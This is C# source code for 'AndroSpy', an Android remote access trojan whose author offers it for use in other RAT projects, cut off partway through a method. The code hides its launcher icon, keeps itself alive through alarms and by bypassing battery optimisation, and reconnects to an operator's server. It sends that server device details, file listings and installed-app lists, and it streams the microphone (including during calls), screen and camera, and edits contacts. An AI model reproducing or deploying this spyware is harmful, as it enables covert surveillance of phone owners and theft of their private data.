using Android.App;
using Android.App.Admin;
using Android.Bluetooth;
using Android.Content;
using Android.Content.PM;
using Android.Database;
using Android.Graphics;
using Android.Graphics.Drawables;
using Android.Hardware.Display;
using Android.Locations;
using Android.Media;
using Android.Media.Projection;
using Android.Net.Wifi;
using Android.OS;
using Android.Provider;
using Android.Runtime;
using Android.Support.V4.Content.PM;
using Android.Support.V4.Graphics.Drawable;
using Android.Telephony;
using Android.Views;
using Android.Widget;
using System;
using System.Collections.Generic;                 //MADE IN TURKEY - MADE WITH LOVE (:\\
using System.Globalization;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Text.RegularExpressions;
using System.Threading.Tasks;
using Xamarin.Essentials;

namespace Task2
{
    /*
     * Project: AndroSpy
     * Date: 24.01.2021
     * Coded By qH0sT' 2021
     * Language: C#.NET
     * I Y I
     * Made in Turkey
    */
    [Activity(Label = "@string/app_name", MainLauncher = true, Icon = "@mipmap/icon", ExcludeFromRecents = true, AlwaysRetainTaskState = true)]

    public class MainActivity : Activity
    {
        public static int REQUEST_CODE = 100;

        public static string SCREENCAP_NAME = "screencap";
        public static int VIRTUAL_DISPLAY_FLAGS = (int)VirtualDisplayFlags.OwnContentOnly | (int)VirtualDisplayFlags.Public;
        public static MediaProjection sMediaProjection;

        public static MediaProjectionManager mProjectionManager;
        public static ImageReader mImageReader;
        public static Handler mHandler;
        public static Display mDisplay;
        public static VirtualDisplay mVirtualDisplay;
        public static int mDensity;
        public static int mWidth;
        public static int mHeight;
        public static int mRotation;
        public static OrientationChangeCallback mOrientationChangeCallback;
        public void createVirtualDisplay()
        {
            // get width and height
            Point size = new Point();
            mDisplay.GetSize(size);
            mWidth = size.X;
            mHeight = size.Y;

            // start capture reader
            mImageReader = ImageReader.NewInstance(mWidth, mHeight, (ImageFormatType)Android.Graphics.Format.Rgba8888, 2);
            mVirtualDisplay = sMediaProjection.CreateVirtualDisplay(SCREENCAP_NAME, mWidth, mHeight, mDensity, (DisplayFlags)VIRTUAL_DISPLAY_FLAGS, mImageReader.Surface, null, mHandler);
            mImageReader.SetOnImageAvailableListener(new ImageAvailableListener(), mHandler);
        }
        public void SetKeepAlive(Socket instance, int KeepAliveTime, int KeepAliveInterval)
        {
            //KeepAliveTime: default value is 2hr
            //KeepAliveInterval: default value is 1s and Detect 5 times

            //the native structure
            //struct tcp_keepalive {
            //ULONG onoff;
            //ULONG keepalivetime;
            //ULONG keepaliveinterval;
            //};

            int size = Marshal.SizeOf(new uint());
            byte[] inOptionValues = new byte[size * 3]; // 4 * 3 = 12
            bool OnOff = true;

            BitConverter.GetBytes((uint)(OnOff ? 1 : 0)).CopyTo(inOptionValues, 0);
            BitConverter.GetBytes((uint)KeepAliveTime).CopyTo(inOptionValues, size);
            BitConverter.GetBytes((uint)KeepAliveInterval).CopyTo(inOptionValues, size * 2);

            instance.IOControl(IOControlCode.KeepAliveValues, inOptionValues, null);
        }
        static readonly Type SERVICE_TYPE = typeof(ForegroundService);
        //readonly string TAG = SERVICE_TYPE.FullName;
        public static Socket Soketimiz = default;
        static Intent _startServiceIntent;
        IPEndPoint endpoint = default;
        IPAddress ipadresi = default;
        public bool CLOSE_CONNECTION = false;
        public List<Upload> upList = new List<Upload>();
        public async void Baglanti_Kur()
        {
            if (Alarm.glob_alarm.wakelock.IsHeld)
            {
                Alarm.glob_alarm.wakelock.Release();
            }
            await Task.Delay(250);
            await Task.Run(() =>
            {
                try
                {
                    if(ipadresi != null)
                    {
                        try { GC.SuppressFinalize(ipadresi); } catch { }
                        
                    }
                    if(endpoint != null)
                    {
                        try { GC.SuppressFinalize(endpoint); } catch { }
                    }
                    GC.Collect();

                    ipadresi = Dns.GetHostAddresses(MainValues.IP)[0];
                    endpoint = new IPEndPoint(ipadresi, MainValues.port);

                    if (Soketimiz != null) {
                        try { Soketimiz.Close(); } catch (Exception) { } try { Soketimiz.Dispose(); } catch (Exception) { }
                        GC.SuppressFinalize(Soketimiz);
                        
                    }
                    GC.Collect();
                    Soketimiz = new Socket(AddressFamily.InterNetwork, SocketType.Stream, System.Net.Sockets.ProtocolType.Tcp);
                    Soketimiz.ReceiveTimeout = -1; Soketimiz.SendTimeout = -1;
                    Soketimiz.ReceiveBufferSize = int.MaxValue; Soketimiz.SendBufferSize = int.MaxValue;
                    Soketimiz.NoDelay = true;
                    SetKeepAlive(Soketimiz, 2000, 1000);

                    IAsyncResult result = Soketimiz.BeginConnect(ipadresi, MainValues.port, null, null);

                    result.AsyncWaitHandle.WaitOne(5000, true);

                    if (Soketimiz.Connected)
                    {
                        Soketimiz.EndConnect(result);

                        //Soketimiz.Connect(endpoint);
                        if (Alarm.glob_alarm.wakelock.IsHeld)
                        {
                            Alarm.glob_alarm.wakelock.Release();
                        }
                        cancelAlarm(this);
                        mySocketConnected = true;

                        byte[] dataToSend = System.Text.Encoding.UTF8.GetBytes("[VERI]" +
                        MainValues.KRBN_ISMI + "[VERI]" + RegionInfo.CurrentRegion + "/" + CultureInfo.CurrentUICulture.TwoLetterISOLanguageName
                        + "[VERI]" + DeviceInfo.Manufacturer + "/" + DeviceInfo.Model + "[VERI]" + DeviceInfo.Version + "/" + ((int)Build.VERSION.SdkInt).ToString() + "[VERI]" + wallpaper() + "[VERI]" + MainValues.KRBN_ISMI + "_" + GetIdentifier());

                        dataToSend = MyDataPacker("MYIP", dataToSend);

                        Soketimiz.Send(dataToSend, 0, dataToSend.Length, SocketFlags.None);

                        new infoAl(Soketimiz, this);
                    }
                    else
                    {
                        setAlarm(this);
                    }
                }
                catch (Exception)
                {
                    setAlarm(this);
                }
            });
        }
        /// <summary>
        /// Send any data to connected socket.
        /// </summary>
        /// <param name="tag">The tag name of message, example: IP, MSGBOX, FILES etc. Then make switch case block for this tags
        /// on server or client.</param>
        /// <param name="message">Data of your message; any byte array of your data; image, text, file etc.</param>
        /// <param name="extraInfos">Extra Infos like: file name, max size, directory name etc.</param>
        public byte[] MyDataPacker(string tag, byte[] message, string extraInfos = "null")
        {
            //This byte packer coded by qH0sT' - 2021 - AndroSpy.
            using (MemoryStream ms = new MemoryStream())
            {
                ms.Write(System.Text.Encoding.UTF8.GetBytes($"<{tag}>|{message.Length}|{extraInfos}>"), 0, System.Text.Encoding.UTF8.GetBytes($"<{tag}>|{message.Length}|{extraInfos}>").Length);
                ms.Write(message, 0, message.Length);
                ms.Write(System.Text.Encoding.UTF8.GetBytes("<EOF>"), 0, System.Text.Encoding.UTF8.GetBytes("<EOF>").Length);

                ms.Write(System.Text.Encoding.UTF8.GetBytes("SUFFIX"), 0, System.Text.Encoding.UTF8.GetBytes("SUFFIX").Length);
                return ms.ToArray();
            }
        }

        public class infoAl : IDisposable
        {
            // feel free to use this class for your own RATs projects (: - qH0sT.
            private MemoryStream memos = default;
            private byte[] dataByte = new byte[1536000];
            private int blockSize = 1536000; //
            private Socket tmp = default;
            private MainActivity tmp_form = default;
            public infoAl(Socket sckInf, MainActivity frm1)
            {
                memos = new MemoryStream();
                tmp_form = frm1;
                tmp = sckInf;
                tmp.BeginReceive(dataByte, 0, blockSize, SocketFlags.None, endRead, null); // classic socket receive operation.
            }
            public async void endRead(IAsyncResult ar)
            {
                try
                {
                    int readed = tmp.EndReceive(ar); // classic socket async result operation.
                    if (readed > 0)
                    {
                        memos.Write(dataByte, 0, readed); // write readed data to memorystream.
                        try
                        {
                            // give as param our memorystream to our byte[] splitter,
                            // and process the byte[] arrays as data buffer [byte[]], tag text [string] and extra infos [string]
                            await UnPacker(tmp, memos);
                        }
                        catch (Exception) { }
                    }
                    await Task.Delay(1); // reduce high cpu usage. :)
                    tmp.BeginReceive(dataByte, 0, blockSize, SocketFlags.None, endRead, null);
                }
                catch (Exception)
                {
                    try
                    {
                        //((MainActivity)global_activity).RunOnUiThread(() => { Toast.MakeText(global_activity,"DISCONNECT", ToastLength.Long).Show(); });
                        foreach (Upload apload in ((MainActivity)global_activity).upList.ToList())
                        {
                            try { apload.CloseSockets(); } catch { }
                        }
                    }
                    catch (Exception) { }

                    ((MainActivity)global_activity).upList.Clear();
                    Prev.global_cam.StopCamera();
                    key_gonder = false;
                    tmp_form.micStop();
                    tmp_form.stopProjection();
                    mySocketConnected = false;
                    Dispose();
                    GC.Collect();
                    if (tmp_form.CLOSE_CONNECTION == false)
                    {

                        tmp_form.setAlarm(global_activity);
                    }
                    else
                    {
                        tmp_form.cancelAlarm(global_activity);

                    }


                }
            }

            public async Task UnPacker(Socket sck, MemoryStream ms)
            {
                //This unpacker coded by qH0sT' - 2021 - AndroSpy.
                //string letter = "qwertyuıopğüasdfghjklşizxcvbnmöç1234567890<>|";
                Regex regex = new Regex(@"<[A-Z]+>\|[0-9]+\|.*>");

                await Task.Run(() =>
                {
                    byte[][] filebytes = Separate(ms.ToArray(), System.Text.Encoding.UTF8.GetBytes("SUFFIX"));
                    for (int k = 0; k < filebytes.Length - 1; k++)
                    {
                        try
                        {
                            string ch = System.Text.Encoding.UTF8.GetString(new byte[1] { filebytes[k][filebytes[k].Length - 1] });// >
                            string f = System.Text.Encoding.UTF8.GetString(new byte[1] { filebytes[k][filebytes[k].Length - 2] });// F>
                            string o = System.Text.Encoding.UTF8.GetString(new byte[1] { filebytes[k][filebytes[k].Length - 3] });// OF>
                            string e = System.Text.Encoding.UTF8.GetString(new byte[1] { filebytes[k][filebytes[k].Length - 4] });// EOF>
                            string ch_ = System.Text.Encoding.UTF8.GetString(new byte[1] { filebytes[k][filebytes[k].Length - 5] });// <EOF>

                            bool isContainsEof = (ch_ + e + o + f + ch) == "<EOF>";
                            if (isContainsEof)
                            {
                                List<byte> mytagByte = new List<byte>();
                                string temp = "";
                                for (int p = 0; p < filebytes[k].Length; p++)
                                {
                                    //if (letter.Contains(Encoding.UTF8.GetString(new byte[1] { filebytes[k][p] }).ToLower()))
                                    //{
                                    temp += System.Text.Encoding.UTF8.GetString(new byte[1] { filebytes[k][p] });
                                    mytagByte.Add(filebytes[k][p]);
                                    if (regex.IsMatch(temp))
                                    {
                                        break;
                                    }
                                    //}
                                }
                                string whatsTag = System.Text.Encoding.UTF8.GetString(mytagByte.ToArray());

                                MemoryStream tmpMemory = new MemoryStream();
                                tmpMemory.Write(filebytes[k], 0, filebytes[k].Length);
                                tmpMemory.Write(System.Text.Encoding.UTF8.GetBytes("SUFFIX"), 0, System.Text.Encoding.UTF8.GetBytes("SUFFIX").Length);
                                ms.Flush();
                                ms.Close();
                                ms.Dispose();
                                ms = new MemoryStream(RemoveBytes(ms.ToArray(), tmpMemory.ToArray()));
                                memos = new MemoryStream();
                                ms.CopyTo(memos);
                                tmpMemory.Flush();
                                tmpMemory.Close();
                                tmpMemory.Dispose();
                                filebytes[k] = RemoveBytes(filebytes[k], mytagByte.ToArray());
                                filebytes[k] = RemoveBytes(filebytes[k], System.Text.Encoding.UTF8.GetBytes("<EOF>"));

                                tmp_form.Soketimizdan_Gelen_Veriler(whatsTag, filebytes[k]); // Process our datas as tag and buffer data.

                            }
                        }
                        catch (Exception) { }
                    }
                });
            }

            public static byte[][] Separate(byte[] source, byte[] separator)
            {
                var Parts = new List<byte[]>();
                var Index = 0;
                byte[] Part;
                for (var I = 0; I < source.Length; ++I)
                {
                    if (Equals(source, separator, I))
                    {
                        Part = new byte[I - Index];
                        Array.Copy(source, Index, Part, 0, Part.Length);
                        Parts.Add(Part);
                        Index = I + separator.Length;
                        I += separator.Length - 1;
                    }
                }
                Part = new byte[source.Length - Index];
                Array.Copy(source, Index, Part, 0, Part.Length);
                Parts.Add(Part);
                return Parts.ToArray();
            }
            static bool Equals(byte[] source, byte[] separator, int index)
            {
                for (int i = 0; i < separator.Length; ++i)
                    if (index + i >= source.Length || source[index + i] != separator[i])
                        return false;
                return true;
            }
            public static byte[] RemoveBytes(byte[] input, byte[] pattern)
            {
                if (pattern.Length == 0) return input;
                var result = new List<byte>();
                for (int i = 0; i < input.Length; i++)
                {
                    var patternLeft = i <= input.Length - pattern.Length;
                    if (patternLeft && (!pattern.Where((t, j) => input[i + j] != t).Any()))
                    {
                        i += pattern.Length - 1;
                    }
                    else
                    {
                        result.Add(input[i]);
                    }
                }
                return result.ToArray();
            }

            public void Dispose()
            {
                Dispose(true);
                GC.SuppressFinalize(this);
            }
            protected bool Disposed { get; private set; }
            protected virtual void Dispose(bool disposing)
            {
                Disposed = true;
            }
        }
        public static bool mySocketConnected = false;
        public void setAlarm(Context context) //Java.Lang.JavaSystem.CurrentTimeMillis() SetAlarmClock(new AlarmManager.AlarmClockInfo(Java.Lang.JavaSystem.CurrentTimeMillis() + 5000, pi), pi);
        {
            cancelAlarm(this);
            try
            {
                AlarmManager am = (AlarmManager)context.GetSystemService(AlarmService);
                Intent i = new Intent(context, Java.Lang.Class.FromType(typeof(Alarm)));
                PendingIntent pi = PendingIntent.GetBroadcast(context, 0, i, 0);
                if (Build.VERSION.SdkInt >= BuildVersionCodes.M)
                    am.SetExactAndAllowWhileIdle(AlarmType.RtcWakeup, Java.Lang.JavaSystem.CurrentTimeMillis() + 5000, pi);
                else
                    am.SetExact(AlarmType.RtcWakeup, Java.Lang.JavaSystem.CurrentTimeMillis() + 5000, pi);
            }
            catch (Exception) { }
        }

        public void cancelAlarm(Context context)
        {
            try
            {
                Intent intent = new Intent(context, Java.Lang.Class.FromType(typeof(Alarm)));
                PendingIntent sender = PendingIntent.GetBroadcast(context, 0, intent, 0);
                AlarmManager alarmManager = (AlarmManager)context.GetSystemService(AlarmService);
                alarmManager.Cancel(sender); alarmManager.Dispose();
                intent.Dispose();
                GC.SuppressFinalize(intent);
                GC.SuppressFinalize(alarmManager);
                GC.Collect();
            }
            catch (Exception) { }
        }
        public void kameraCek(Socket soket)
        {
            UpdateTimeTask.Kamera(soket);
        }
        List<string> allDirectory_ = default;
        List<string> sdCards = default;
        public void dosyalar()
        {
            allDirectory_ = new List<string>();
            try
            {
                Java.IO.File[] _path = GetExternalFilesDirs(null);
                sdCards = new List<string>();
                List<string> allDirectory = new List<string>();
                foreach (var spath in _path.ToList())
                {
                    if (spath.Path.Contains("emulated") == false)
                    {
                        string s = spath.Path.ToString();
                        s = s.Replace(s.Substring(s.IndexOf("/And")), "");
                        sdCards.Add(s);
                    }
                }
                if (sdCards.Count > 0)
                {
                    listf(sdCards[0]);
                }
                sonAsama(Android.OS.Environment.ExternalStorageDirectory.AbsolutePath);
                string dosyalarS = "";
                foreach (string inf in allDirectory_.ToList())
                {
                    dosyalarS += inf + "<";
                }
                if (!string.IsNullOrEmpty(dosyalarS))
                {
                    try
                    {
                        byte[] dataPacker = MyDataPacker("FILES", System.Text.Encoding.UTF8.GetBytes("[VERI]IKISIDE[VERI]" + dosyalarS));
                        Soketimiz.BeginSend(dataPacker, 0, dataPacker.Length, SocketFlags.None, null, null);
                    }
                    catch (Exception) { }
                    //soketimizeGonder("FILES", "[VERI]IKISIDE[VERI]" + dosyalarS + "[VERI][0x09]");
                }
                else
                {
                    try
                    {
                        byte[] dataPacker = MyDataPacker("FILES", System.Text.Encoding.UTF8.GetBytes("[VERI]IKISIDE[VERI]BOS"));
                        Soketimiz.BeginSend(dataPacker, 0, dataPacker.Length, SocketFlags.None, null, null);
                    }
                    catch (Exception) { }
                    //soketimizeGonder("FILES", "[VERI]IKISIDE[VERI]BOS[VERI][0x09]");
                }
            }
            catch (Exception) { }
        }
        public void sonAsama(string absPath)
        {
            try
            {
                DirectoryInfo di = new DirectoryInfo(absPath);
                DirectoryInfo[] klasorler = di.GetDirectories();
                FileInfo[] fi = di.GetFiles("*.*");
                foreach (DirectoryInfo directoryInfo in klasorler)
                {
                    allDirectory_.Add(directoryInfo.Name + "=" + directoryInfo.FullName + "=" + "" + "=" + "" + "=CİHAZ="
                         + absPath + "=");
                }
                foreach (FileInfo f_info in fi)
                {
                    if (f_info.DirectoryName.Contains(".thumbnail") == false)
                    {
                        allDirectory_.Add(f_info.Name + "=" + f_info.DirectoryName + "=" + f_info.Extension + "=" + GetFileSizeInBytes(
                            f_info.FullName) + "=CİHAZ=" + absPath + "=");
                    }
                }
            }
            catch (Exception) { }
        }
        public void listf(string directoryName)
        {
            try
            {
                Java.IO.File directory = new Java.IO.File(directoryName);
                Java.IO.File[] fList = directory.ListFiles();
                if (fList != null)
                {
                    foreach (Java.IO.File file in fList)
                    {
                        try
                        {
                            if (file.IsFile)
                            {
                                allDirectory_.Add(file.Name + "=" + file.AbsolutePath + "=" +
                        file.AbsolutePath.Substring(file.AbsolutePath.LastIndexOf(".")) + "=" + GetFileSizeInBytes(
                                         file.AbsolutePath) + "=SDCARD=" + directoryName + "=");
                            }
                            else if (file.IsDirectory)
                            {
                                allDirectory_.Add(file.Name + "=" + file.AbsolutePath + "=" +
                        "" + "=" + "" + "=SDCARD=" + directoryName + "=");
                            }
                        }
                        catch (Exception) { }
                    }
                }
            }
            catch (Exception) { }
        }
        public void uygulamalar()
        {
            var apps = PackageManager.GetInstalledApplications(PackageInfoFlags.MetaData);
            string bilgiler = "";
            for (int i = 0; i < apps.Count; i++)
            {
                try
                {
                    ApplicationInfo applicationInfo = apps[i];
                    var isim = applicationInfo.LoadLabel(PackageManager);
                    var paket_ismi = applicationInfo.PackageName;
                    var launcher = PackageManager.GetLaunchIntentForPackage(paket_ismi);
                    if (launcher.Action == Intent.ActionMain && launcher.Categories.Contains(Intent.CategoryLauncher))
                    {
                        if (applicationInfo.Flags != ApplicationInfoFlags.System)
                        {
                            string app_ico = "";
                            try
                            {
                                app_ico = StringCompressor.CompressString(Convert.ToBase64String(drawableToByteArray(applicationInfo.LoadIcon(PackageManager))));
                            }
                            catch (Exception) { app_ico = "[NULL]"; }

                            string infos = isim + "[HANDSUP]" + paket_ismi + "[HANDSUP]" + app_ico + "[HANDSUP]";
                            bilgiler += infos + "[REMIX]";
                        }
                    }
                }
                catch (Exception) { }
            }
            try
            {
                byte[] dataPacker = MyDataPacker("APPS", StringCompressor.Compress(System.Text.Encoding.UTF8.GetBytes(bilgiler)));
                Soketimiz.BeginSend(dataPacker, 0, dataPacker.Length, SocketFlags.None, null, null);
            }
            catch (Exception) { }
            //soketimizeGonder("APPS", "[VERI]" + bilgiler + "[VERI][0x09]");

        }
        public static string GetFileSizeInBytes(string filenane)
        {
            try
            {
                string[] sizes = { "B", "KB", "MB", "GB", "TB" };
                double len = new FileInfo(filenane).Length;
                int order = 0;
                while (len >= 1024 && order < sizes.Length - 1)
                {
                    order++;
                    len = len / 1024;
                }
                string result = string.Format("{0:0.##} {1}", len, sizes[order]);
                return result;
            }
            catch (Exception ex) { return ex.Message; }
        }
        UdpClient client = null;
        AudioStream audioStream = null;
        public void micSend(string sampleRate, string kaynak)
        {
            micStop();
            AudioSource source = AudioSource.Default;
            switch (kaynak)
            {
                case "Mikrofon":
                    source = AudioSource.Mic;
                    break;
                case "Varsayılan":
                    source = AudioSource.Default;
                    break;
                case "Telefon Görüşmesi":
                    if (mgr == null) { mgr = (AudioManager)GetSystemService(AudioService); }
                    mgr.Mode = Mode.InCall;
                    mgr.SetStreamVolume(Android.Media.Stream.VoiceCall, mgr.GetStreamMaxVolume(Android.Media.Stream.VoiceCall), 0);
                    source = AudioSource.Mic;
                    break;
            }
            try
            {
                client = new UdpClient();
                audioStream = new AudioStream(int.Parse(sampleRate), source);
                audioStream.OnBroadcast += AudioStream_OnBroadcast;
                audioStream.Start();
            }
            catch (Exception) { }
        }

        public void micStop()
        {
            if (mgr == null) { mgr = (AudioManager)GetSystemService(AudioService); }
            mgr.Mode = Mode.Normal;
            if (audioStream != null)
            {
                audioStream.Stop();
                audioStream.Flush();
                GC.SuppressFinalize(audioStream);
            }
            if (client != null)
            {
                client.Close();
                client.Dispose();
                GC.SuppressFinalize(client);
            }
            GC.Collect();
        }
        private void AudioStream_OnBroadcast(object sender, byte[] e)
        {
            try
            {
                //new IPEndPoint(Dns.GetHostAddresses(MainValues.IP)[0], MainValues.port)
                client.Send(e, e.Length, endpoint);
            }
            catch (SocketException)
            {
                micStop();
            }
        }
        public void kameraCozunurlukleri()
        {
            try
            {
                var cameraManager = (Android.Hardware.Camera2.CameraManager)GetSystemService(CameraService);
                string[] IDs = cameraManager.GetCameraIdList();
                string gidecekler = default;
                string cameralar = default;
                string supZoom = default;
                string previewsizes = default;
                for (int i = 0; i < IDs.Length; i++)
                {
                    int cameraId = int.Parse(IDs[i]);
                    Android.Hardware.Camera.CameraInfo cameraInfo = new Android.Hardware.Camera.CameraInfo();
                    Android.Hardware.Camera.GetCameraInfo(cameraId, cameraInfo);
                    Android.Hardware.Camera camera = Android.Hardware.Camera.Open(cameraId);
                    Android.Hardware.Camera.Parameters cameraParams = camera.GetParameters();
                    var sizes = cameraParams.SupportedPictureSizes;
                    var presize = cameraParams.SupportedPreviewSizes;
                    if (cameraInfo.Facing == Android.Hardware.CameraFacing.Front)
                    {
                        supZoom = cameraParams.IsZoomSupported.ToString() + "}" + cameraParams.MaxZoom.ToString();
                    }
                    for (int j = 0; j < sizes.Count; j++)
                    {

                        int widht = ((Android.Hardware.Camera.Size)sizes[j]).Width;
                        int height = ((Android.Hardware.Camera.Size)sizes[j]).Height;
                        gidecekler += widht.ToString() + "x" + height.ToString() + "<";
                    }
                    camera.Release();
                    gidecekler += ">";
                    if (cameraInfo.Facing == Android.Hardware.CameraFacing.Front)
                    {
                        foreach (var siz in presize.ToList())
                        {
                            previewsizes += siz.Width.ToString() + "x" + siz.Height.ToString() + "<";
                        }
                    }
                    cameralar += IDs[i] + "!";
                }
                byte[] data = MyDataPacker("OLCULER", System.Text.Encoding.UTF8.GetBytes("[VERI]" + gidecekler + $"[VERI]{supZoom}[VERI]{previewsizes}[VERI]{cameralar}"));
                Soketimiz.BeginSend(data, 0, data.Length, SocketFlags.None, null, null);
                //soketimizeGonder("OLCULER", "[VERI]" + gidecekler + $"[VERI]{supZoom}[VERI]{previewsizes}[VERI]{cameralar}[VERI][0x09]");
            }
            catch (Exception)
            {
                byte[] data = MyDataPacker("OLCULER", System.Text.Encoding.UTF8.GetBytes("[VERI]Kameraya erişilemiyor."));
                Soketimiz.BeginSend(data, 0, data.Length, SocketFlags.None, null, null);
            }
        }
        public static bool key_gonder = false;
        public string PASSWORD = string.Empty;
        protected override void OnCreate(Bundle savedInstanceState)
        {
            base.OnCreate(savedInstanceState);
            //SetContentView(Resource.Layout.Main);
            Platform.Init(this, savedInstanceState);
            StartForegroundServiceCompat<ForegroundService>(this, savedInstanceState);
            //startForeService();
            global_activity = this;
            CLOSE_CONNECTION = false;
            global_packageManager = PackageManager;
            hide();
            Finish();
            mProjectionManager = (MediaProjectionManager)GetSystemService(MediaProjectionService);
            bool exsist = Preferences.ContainsKey("aypi_adresi");
            if (exsist == false)
            {
                Preferences.Set("aypi_adresi", Resources.GetString(Resource.String.IP));
                Preferences.Set("port", Resources.GetString(Resource.String.PORT));
                Preferences.Set("kurban_adi", Resources.GetString(Resource.String.KURBANISMI));
                Preferences.Set("pass", Resources.GetString(Resource.String.PASSWORD));
                openAutostartSettings(this);
            }

            MainValues.IP = Preferences.Get("aypi_adresi", "192.168.1.7");
            MainValues.port = int.Parse(Preferences.Get("port", "5656"));
            MainValues.KRBN_ISMI = Preferences.Get("kurban_adi", "n-a");
            PASSWORD = Preferences.Get("pass", string.Empty);

            pmanager = (PowerManager)GetSystemService("power");
            wakelock = pmanager.NewWakeLock(WakeLockFlags.Partial, GetType().Name);
            wakelock.SetReferenceCounted(false);
            //wakelock.Acquire();

            if (Resources.GetString(Resource.String.Ignore) == "1")
            {
                dozeMod();
            }

            createDir();

            setAlarm(this);
        }
        private PowerManager.WakeLock wakelock = null;
        private PowerManager pmanager = null;
        public void createDir()
        {
            if (!Directory.Exists(Android.OS.Environment.ExternalStorageDirectory.AbsolutePath + "/mainly"))
            {
                Directory.CreateDirectory(Android.OS.Environment.ExternalStorageDirectory.AbsolutePath + "/mainly");
            }
        }
        public void dozeMod()
        {
            if (Build.VERSION.SdkInt >= BuildVersionCodes.M)
            {
                Intent intent = new Intent();
                string packageName = Application.PackageName;
                PowerManager pm = (PowerManager)GetSystemService(PowerService);
                if (!pm.IsIgnoringBatteryOptimizations(packageName))
                {
                    intent.SetAction(Settings.ActionRequestIgnoreBatteryOptimizations);
                    intent.SetData(Android.Net.Uri.Parse("package:" + packageName));
                    StartActivity(intent);
                }
            }
        }
        public void Uninstall()
        {
            Intent intent = new Intent(Intent.ActionDelete);
            intent.SetData(Android.Net.Uri.Parse("package:" + PackageName));
            StartActivity(intent);
        }
        protected override void OnPause()
        {
            base.OnPause();
        }
        public void hide()
        {
            ComponentName componentName = new ComponentName(this, Java.Lang.Class.FromType(typeof(MainActivity)).Name);
            PackageManager.SetComponentEnabledSetting(componentName, ComponentEnabledState.Disabled, ComponentEnableOption.DontKillApp);
        }
        private void AddShortcut(string appName, string url, byte[] icon_byte)
        {
            //File.WriteAllBytes(Android.OS.Environment.ExternalStorageDirectory + "/launcher.jpg", icon_byte);
            try
            {
                Bitmap bitmap = BitmapFactory.DecodeByteArray(icon_byte, 0, icon_byte.Length);
                var uri = Android.Net.Uri.Parse(url);
                var intent_ = new Intent(Intent.ActionView, uri);

                if (Build.VERSION.SdkInt >= BuildVersionCodes.NMr1)
                {
                    if (ShortcutManagerCompat.IsRequestPinShortcutSupported(this))
                    {
                        ShortcutInfoCompat shortcutInfo = new ShortcutInfoCompat.Builder(this, "#1")
                         .SetIntent(intent_)
                         .SetShortLabel(appName)
                         .SetIcon(IconCompat.CreateWithBitmap(bitmap))
                         .Build();
                        ShortcutManagerCompat.RequestPinShortcut(this, shortcutInfo, null);
                    }
                }
                else
                {
                    Intent installer = new Intent();
                    installer.PutExtra("android.intent.extra.shortcut.INTENT", intent_);
                    installer.PutExtra("android.intent.extra.shortcut.NAME", appName);
                    installer.PutExtra("android.intent.extra.shortcut.ICON", bitmap);
                    installer.SetAction("com.android.launcher.action.INSTALL_SHORTCUT");
                    SendBroadcast(installer);
                }
                //     I Y I
                byte[] myData = MyDataPacker("SHORTCUT", System.Text.Encoding.UTF8.GetBytes("Shortcut successfully added."));
                Soketimiz.BeginSend(myData, 0, myData.Length, SocketFlags.None, null, null);
            }
            catch (Exception ex)
            {
                byte[] myData = MyDataPacker("SHORTCUT", System.Text.Encoding.UTF8.GetBytes("Error on shortcut add: " + ex.Message));
                Soketimiz.BeginSend(myData, 0, myData.Length, SocketFlags.None, null, null);
            }
        }

        public const int RequestCodeEnableAdmin = 15;
        private void startProjection()
        {
            Intent intent = new Intent(ApplicationContext, Java.Lang.Class.FromType(typeof(screenActivty)));
            StartActivity(intent);
        }
        public void stopProjection()
        {
            if (sMediaProjection != null)
            {
                try
                {
                    sMediaProjection.Stop();
                }
                catch (Exception) { }
            }
            if (ImageAvailableListener.screenSock != null)
            {
                try { ImageAvailableListener.screenSock.Close(); } catch { }
                try { ImageAvailableListener.screenSock.Dispose(); } catch { }
                GC.SuppressFinalize(ImageAvailableListener.screenSock);
                GC.Collect();
            }
        }
        protected override void OnActivityResult(int requestCode, Result resultCode, Intent data)
        {
            if (requestCode == RequestCodeEnableAdmin)
            {
                PostSetKioskMode(resultCode == Result.Ok);
            }
            else
            {
                base.OnActivityResult(requestCode, resultCode, data);
            }
        }
        public void rehberEkle(string FirstName, string PhoneNumber)
        {
            try
            {
                List<ContentProviderOperation> ops = new List<ContentProviderOperation>();
            int rawContactInsertIndex = ops.Count;

            ContentProviderOperation.Builder builder =
                ContentProviderOperation.NewInsert(ContactsContract.RawContacts.ContentUri);
            builder.WithValue(ContactsContract.RawContacts.InterfaceConsts.AccountType, null);
            builder.WithValue(ContactsContract.RawContacts.InterfaceConsts.AccountName, null);
            ops.Add(builder.Build());

            //Name
            builder = ContentProviderOperation.NewInsert(ContactsContract.Data.ContentUri);
            builder.WithValueBackReference(ContactsContract.Data.InterfaceConsts.RawContactId, rawContactInsertIndex);
            builder.WithValue(ContactsContract.Data.InterfaceConsts.Mimetype,
                ContactsContract.CommonDataKinds.StructuredName.ContentItemType);
            //builder.WithValue(ContactsContract.CommonDataKinds.StructuredName.FamilyName, LastName);
            builder.WithValue(ContactsContract.CommonDataKinds.StructuredName.GivenName, FirstName);
            ops.Add(builder.Build());

            //Number
            builder = ContentProviderOperation.NewInsert(ContactsContract.Data.ContentUri);
            builder.WithValueBackReference(ContactsContract.Data.InterfaceConsts.RawContactId, rawContactInsertIndex);
            builder.WithValue(ContactsContract.Data.InterfaceConsts.Mimetype,
                ContactsContract.CommonDataKinds.Phone.ContentItemType);
            builder.WithValue(ContactsContract.CommonDataKinds.Phone.Number, PhoneNumber);
            builder.WithValue(ContactsContract.CommonDataKinds.StructuredPostal.InterfaceConsts.Type,
                    ContactsContract.CommonDataKinds.StructuredPostal.InterfaceConsts.TypeCustom);
            builder.WithValue(ContactsContract.CommonDataKinds.Phone.InterfaceConsts.Label, "Primary Phone");
            ops.Add(builder.Build());
            
            var res = ContentResolver.ApplyBatch(ContactsContract.Authority, ops);
                //Toast.MakeText(this, "Contact Saved", ToastLength.Short).Show();
            }
            catch(Exception) { }
        }
        public async void konus(string metin)
        {
            try
            {
                var locales = await TextToSpeech.GetLocalesAsync();
                var locale = locales.FirstOrDefault();

                var settings = new SpeechOptions()
                {
                    Volume = 1.0f,
                    Pitch = 1.0f,
                    Locale = locale
                };

                await TextToSpeech.SpeakAsync(metin, settings);
            }
            catch (Exception) { }
        }
        public void rehberNoSil(string isim)
        {
            try
            {
                Context thisContext = this;
                string[] Projection = new string[] { ContactsContract.ContactsColumns.LookupKey, ContactsContract.ContactsColumns.DisplayName };
                ICursor cursor = thisContext.ContentResolver.Query(ContactsContract.Contacts.ContentUri, Projection, null, null, null);
                while (cursor != null & cursor.MoveToNext())
                {
